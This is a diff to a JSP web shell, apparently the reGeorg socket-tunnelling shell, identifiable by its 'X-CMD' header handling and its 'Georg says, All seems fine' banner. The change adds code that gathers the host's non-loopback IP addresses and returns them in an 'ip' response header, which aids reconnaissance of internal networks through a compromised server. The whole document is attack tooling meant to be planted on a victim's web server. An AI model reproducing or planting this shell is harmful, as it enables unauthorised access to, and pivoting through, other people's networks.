@@ -1,4 +1,4 @@
-<%@page import="java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket" trimDirectiveWhitespaces="true"%><%
+<%@page import="java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.NetworkInterface,java.net.InetAddress,java.util.Enumeration,java.net.UnknownHostException, java.net.Socket" trimDirectiveWhitespaces="true"%><%
     String cmd = request.getHeader("X-CMD");
     if (cmd != null) {
         response.setHeader("X-STATUS", "OK");
@@ -79,7 +79,26 @@
             }
         } 
     } else {
-        //PrintWriter o = response.getWriter();  
-        out.print("Georg says, 'All seems fine'");  
+        String s = "";
+        try{
+            Enumeration<NetworkInterface> ns = null;
+            ns = NetworkInterface.getNetworkInterfaces();
+            
+            while (ns != null && ns.hasMoreElements())
+            {
+                NetworkInterface n = ns.nextElement();
+                Enumeration<InetAddress> is = n.getInetAddresses();
+                while (is.hasMoreElements())
+                {
+                    InetAddress i = is.nextElement();
+                    if (!i.isLoopbackAddress() && !i.isLinkLocalAddress() && !i.isMulticastAddress())
+                        s = s + "," + i.getHostAddress();
+                }
+            }
+            if(0 < s.length())
+                response.setHeader("ip", s);
+        }catch(Exception e){}
+        //PrintWriter o = response.getWriter();
+        out.print("Georg says, 'All seems fine'");
     }
 %>
